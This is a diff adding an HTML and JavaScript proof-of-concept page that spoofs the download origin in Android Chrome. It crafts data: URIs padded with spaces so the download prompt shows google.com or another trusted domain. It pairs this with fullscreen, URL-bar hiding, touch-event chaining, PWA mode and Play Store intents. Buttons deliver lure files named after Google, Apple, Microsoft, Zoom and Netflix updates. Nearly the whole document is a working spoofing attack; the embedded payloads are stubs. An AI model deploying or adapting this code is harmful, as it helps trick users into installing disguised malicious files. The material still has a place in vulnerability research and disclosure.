@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+<title>Android Chrome - Download Origin Spoof Bypass</title>
+<style>
+:root { --bg: #0a0a0f; --card: #14141e; --border: #222233; --red: #ff4444; --green: #00e676; --accent: #448aff; }
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif; background: var(--bg); color: #ddd; padding: 14px; -webkit-tap-highlight-color: transparent; }
+.container { max-width: 680px; margin: 0 auto; }
+h1 { font-size: 18px; color: #fff; }
+h1 .red { color: var(--red); }
+.badge { display:inline-block; padding:3px 8px; border-radius:3px; font-size:10px; font-weight:600; margin:2px; }
+.b-r { background:rgba(255,68,68,.15); color:var(--red); }
+.b-g { background:rgba(0,230,118,.15); color:var(--green); }
+.b-b { background:rgba(68,138,255,.15); color:var(--accent); }
+.card { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:14px; margin-bottom:12px; }
+.card h3 { font-size:14px; color:#fff; margin-bottom:8px; }
+.card p { font-size:12px; color:#888; line-height:1.5; margin-bottom:8px; }
+button { padding:12px 16px; border:1px solid var(--border); background:var(--card); color:#ddd; border-radius:8px; font-size:13px; margin:4px; cursor:pointer; touch-action:manipulation; -webkit-tap-highlight-color:transparent; }
+button:active { transform:scale(.96); opacity:.8; }
+button.danger { border-color:var(--red); color:var(--red); }
+button.green { border-color:var(--green); color:var(--green); }
+button.accent { border-color:var(--accent); color:var(--accent); }
+pre { background:#0d0d16; padding:10px; border-radius:6px; font-size:10px; overflow-x:auto; color:#888; border:1px solid var(--border); white-space:pre-wrap; word-break:break-all; line-height:1.4; }
+#log { max-height:200px; overflow-y:auto; font-family:monospace; font-size:10px; line-height:1.5; }
+.log-w { color:var(--red); }
+.log-o { color:var(--green); }
+.log-i { color:var(--accent); }
+</style>
+</head>
+<body>
+<div class="container">
+
+<h1>Android Chrome <span class="red">Download Origin Spoof</span></h1>
+<p style="color:#888;font-size:12px;margin-bottom:14px;">
+  <span class="badge b-r">CWE-451</span>
+  <span class="badge b-b">Data URI Abuse</span>
+  <span class="badge b-g">Android Bypass</span>
+  <span class="badge b-r">Chrome 143+</span>
+</p>
+
+<div class="card">
+  <h3>Attack Vector</h3>
+  <p>
+    Crafting a <code>data:</code> URI with an embedded hostname tricks Chrome's
+    download manager into displaying a <strong>spoofed origin</strong>.
+    On Android, combining this with <strong>fullscreen mode</strong> hides the
+    real URL bar, making the attack significantly more convincing.
+  </p>
+  <pre>data:https://google.com/[...250 spaces...]application/vnd.android.package-archive;base64,[PAYLOAD]
+       ─────────────────                                                                    ───────
+       Fake origin shown                                                                    Hidden
+       in download prompt                                                                   MIME type</pre>
+</div>
+
+<!-- Bypass #1: Fullscreen + Download -->
+<div class="card">
+  <h3>Bypass #1: Fullscreen + Download (Most Effective on Android)</h3>
+  <p>Fullscreen hides the URL bar. Victim only sees the spoofed download origin.</p>
+  <button class="danger" onclick="bypass1_fullscreenDownload()">
+    Execute: Fullscreen → Spoof Download
+  </button>
+  <button class="danger" onclick="bypass1b()">
+    Execute: Fullscreen → Spoof + Open Google (Distraction)
+  </button>
+</div>
+
+<!-- Bypass #2: Scroll-to-Hide URL Bar -->
+<div class="card">
+  <h3>Bypass #2: Scroll-to-Hide URL Bar (Android)</h3>
+  <p>On Android Chrome, scrolling down hides the URL bar naturally. Trigger download after scroll.</p>
+  <button class="danger" onclick="bypass2_scrollHide()">
+    Execute: Auto-Scroll → Download
+  </button>
+</div>
+
+<!-- Bypass #3: Touch Event Chaining -->
+<div class="card">
+  <h3>Bypass #3: Touch Event Chaining</h3>
+  <p>Chain touch events to bypass user-gesture requirements and trigger download.</p>
+  <button class="danger" onclick="bypass3_touchChain()">
+    Execute: Touch Chain Download
+  </button>
+  <button onclick="bypass3b()">
+    Execute: Swipe → Download
+  </button>
+</div>
+
+<!-- Bypass #4: PWA Standalone Mode -->
+<div class="card">
+  <h3>Bypass #4: PWA / Standalone Mode</h3>
+  <p>If the site is added to home screen (PWA), there is NO URL bar at all.</p>
+  <button class="accent" onclick="bypass4_pwaCheck()">
+    Check PWA Mode Status
+  </button>
+  <button class="danger" onclick="bypass1_fullscreenDownload()">
+    Trigger Download (in PWA/Fullscreen)
+  </button>
+</div>
+
+<!-- Bypass #5: Intent Scheme Combo -->
+<div class="card">
+  <h3>Bypass #5: Intent Scheme + Download Combo</h3>
+  <p>On Android, <code>intent://</code> URLs can open apps. Combined with download spoof.</p>
+  <button class="danger" onclick="bypass5_intentCombo()">
+    Execute: Intent + Download Combo
+  </button>
+  <button onclick="bypass5b()">
+    Execute: Market Link + Download
+  </button>
+</div>
+
+<!-- Bypass #6: Multiple File Types -->
+<div class="card">
+  <h3>Bypass #6: Convincing File Types</h3>
+  <p>Different file extensions that appear more legitimate to victims.</p>
+  <button class="danger" onclick="spoofCustom('google.com','apk','google-play-protect.apk','application/vnd.android.package-archive')">Google → .apk</button>
+  <button class="danger" onclick="spoofCustom('apple.com','dmg','safari-update.dmg','application/x-apple-diskimage')">Apple → .dmg</button>
+  <button class="danger" onclick="spoofCustom('microsoft.com','exe','defender-update.exe','application/x-msdownload')">Microsoft → .exe</button>
+  <button onclick="spoofCustom('adobe.com','pdf','adobe-reader-update.pdf','application/pdf')">Adobe → .pdf</button>
+  <button onclick="spoofCustom('zoom.us','apk','zoom-meeting.apk','application/vnd.android.package-archive')">Zoom → .apk</button>
+  <button onclick="spoofCustom('netflix.com','apk','netflix-update.apk','application/vnd.android.package-archive')">Netflix → .apk</button>
+</div>
+
+<div class="card">
+  <h3>Event Log</h3>
+  <pre id="log">[*] Android download spoof loaded. Tap buttons to test.</pre>
+</div>
+
+</div>
+
+<script>
+const S = ' '.repeat(250);
+
+function L(m,c){var l=document.getElementById('log');var t=new Date().toLocaleTimeString();var p=c==='w'?'[!]':c==='o'?'[+]':'[*]';l.innerHTML+=p+' '+t+' '+m+'\n';l.scrollTop=l.scrollHeight;console.log(p,t,m);}
+
+function spoof(domain, mime, filename, payload_b64) {
+  var uri = 'data:https://'+domain+'/'+S+mime+';base64,'+payload_b64;
+  var a = document.createElement('a');
+  a.href = uri;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(function(){ if(a.parentNode) a.remove(); }, 100);
+}
+
+function spoofCustom(domain, ext, filename, mime) {
+  var payloads = {
+    apk: 'UEsDBAoAAAAAALiJkFcAAAAAAAAAAAAAAAALAAAAdGVzdC5kZXgKAQAAABQAAABQSwECFAAKAAAAAAC4iZBXAAAAAAAAAAAAAAAACwAAAAAAAAAAAAAAgAEAAAAAdGVzdC5kZXhQSwUGAAAAAAEAAQA5AAAALgAAAAAA',
+    exe: 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
+    dmg: 'AAABAAAADAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==',
+    pdf: 'JVBERi0xLjQKMSAwIG9iago8PCAvVHlwZSAvQ2F0YWxvZwovUGFnZXMgMiAwIFIKPj4KZW5kb2JqCg==',
+  };
+  var payload = payloads[ext] || payloads.apk;
+  L('Spoof: '+domain+' → '+filename, 'w');
+  L('Download origin will show: '+domain, 'w');
+  L('Real page origin: '+window.location.hostname, 'o');
+  spoof(domain, mime, filename, payload);
+}
+
+// ====== BYPASS 1: Fullscreen + Download ======
+function bypass1_fullscreenDownload() {
+  L('Requesting fullscreen...', 'w');
+  var el = document.documentElement;
+  if (el.requestFullscreen) {
+    el.requestFullscreen().then(function() {
+      L('Fullscreen ACTIVE - URL bar HIDDEN', 'o');
+      setTimeout(function() {
+        spoofCustom('play.google.com','apk','google-play-protect.apk','application/vnd.android.package-archive');
+        L('Download triggered in fullscreen - victim sees NO real URL', 'w');
+      }, 600);
+    }).catch(function(e) {
+      L('Fullscreen denied: '+e.message, 'w');
+      spoofCustom('play.google.com','apk','google-play-protect.apk','application/vnd.android.package-archive');
+    });
+  } else if (el.webkitRequestFullscreen) {
+    el.webkitRequestFullscreen();
+    setTimeout(function() {
+      spoofCustom('play.google.com','apk','google-play-protect.apk','application/vnd.android.package-archive');
+    }, 600);
+  }
+}
+
+function bypass1b() {
+  // Original POC: fullscreen + distraction tab + download
+  L('Executing original POC: fullscreen + google.com distraction + download', 'w');
+  var el = document.documentElement;
+  var doIt = function() {
+    setTimeout(function() {
+      // Open google in new tab as distraction
+      window.open('https://www.google.com', '_blank');
+      // Trigger download
+      setTimeout(function() {
+        spoofCustom('google.com','apk','google-services.apk','application/vnd.android.package-archive');
+        L('Download triggered! Victim sees google.com as origin', 'w');
+      }, 400);
+    }, 300);
+  };
+  if (el.requestFullscreen) {
+    el.requestFullscreen().then(doIt).catch(doIt);
+  } else {
+    doIt();
+  }
+}
+
+// ====== BYPASS 2: Scroll Hide URL ======
+function bypass2_scrollHide() {
+  L('Auto-scrolling to hide URL bar (Android Chrome behavior)...', 'w');
+  // Add spacer to enable scrolling
+  var spacer = document.createElement('div');
+  spacer.style.height = '200vh';
+  spacer.style.width = '100%';
+  document.body.appendChild(spacer);
+  // Smooth scroll down to hide URL bar
+  window.scrollTo({ top: 300, behavior: 'smooth' });
+  setTimeout(function() {
+    L('URL bar should be hidden now', 'o');
+    spoofCustom('google.com','apk','google-play-update.apk','application/vnd.android.package-archive');
+    L('Download triggered with URL bar hidden', 'w');
+  }, 800);
+}
+
+// ====== BYPASS 3: Touch Chain ======
+function bypass3_touchChain() {
+  L('Setting up touch event chain...', 'w');
+  L('Touch anywhere on screen to trigger', 'w');
+  var handler = function(e) {
+    document.removeEventListener('touchstart', handler);
+    document.removeEventListener('click', handler);
+    L('Touch detected - triggering download after delay', 'o');
+    setTimeout(function() {
+      spoofCustom('google.com','apk','google-services.apk','application/vnd.android.package-archive');
+      L('Download triggered via touch chain', 'w');
+    }, 500);
+  };
+  document.addEventListener('touchstart', handler, { once: true });
+  document.addEventListener('click', handler, { once: true });
+}
+
+function bypass3b() {
+  L('Swipe gesture trigger - swipe down on page', 'w');
+  var startY = 0;
+  document.addEventListener('touchstart', function(e) {
+    startY = e.touches[0].clientY;
+  }, { once: true });
+  document.addEventListener('touchend', function(e) {
+    var dy = e.changedTouches[0].clientY - startY;
+    if (dy > 50) {
+      L('Swipe down detected ('+dy+'px) - triggering download', 'o');
+      spoofCustom('google.com','apk','google-play.apk','application/vnd.android.package-archive');
+    } else {
+      L('Swipe too short ('+dy+'px) - try again', 'w');
+    }
+  }, { once: true });
+}
+
+// ====== BYPASS 4: PWA Check ======
+function bypass4_pwaCheck() {
+  var isPWA = window.matchMedia('(display-mode: standalone)').matches;
+  var isFullscreen = window.matchMedia('(display-mode: fullscreen)').matches;
+  L('Display mode: '+(isPWA?'standalone (PWA)':isFullscreen?'fullscreen':'browser'), 'o');
+  L('PWA mode: URL bar is '+(isPWA||isFullscreen?'HIDDEN':'VISIBLE'), (isPWA||isFullscreen)?'w':'o');
+  if (!isPWA) {
+    L('Not in PWA mode. Add to home screen for maximum effect.', 'w');
+  }
+}
+
+// ====== BYPASS 5: Intent Combo ======
+function bypass5_intentCombo() {
+  L('Intent + Download combo attack...', 'w');
+  // Try to open Play Store
+  var intentUrl = 'intent://play.google.com/store/apps/details?id=com.google.android.gms#Intent;scheme=https;package=com.android.vending;end';
+  try {
+    window.location.href = intentUrl;
+  } catch(e) {}
+  // Then trigger spoofed download
+  setTimeout(function() {
+    spoofCustom('play.google.com','apk','google-play-update.apk','application/vnd.android.package-archive');
+    L('Download triggered - appears from Play Store context', 'w');
+  }, 1000);
+}
+
+function bypass5b() {
+  L('Market link combo attack...', 'w');
+  // Open Play Store via market link
+  window.open('market://details?id=com.google.android.gms', '_blank');
+  setTimeout(function() {
+    spoofCustom('play.google.com','apk','google-play-services.apk','application/vnd.android.package-archive');
+    L('Download triggered - seems from Play Store', 'w');
+  }, 800);
+}
+
+// Init
+(function() {
+  var ua = navigator.userAgent;
+  var isAndroid = /Android/i.test(ua);
+  var isChrome = /Chrome/i.test(ua) && !/Edge/i.test(ua);
+  var isMobile = /Mobi/i.test(ua);
+  L('Device: '+(isAndroid?'Android':isMobile?'iOS Mobile':'Desktop')+' | Browser: '+(isChrome?'Chrome':'Other'), 'o');
+  if (isAndroid) {
+    L('Android Chrome detected - all bypasses available', 'o');
+    L('Best: Fullscreen + Download bypass (hides URL bar)', 'w');
+  }
+  L('Page origin: '+window.location.hostname);
+  L('Test each bypass section above');
+})();
+</script>
+</body>
+</html>
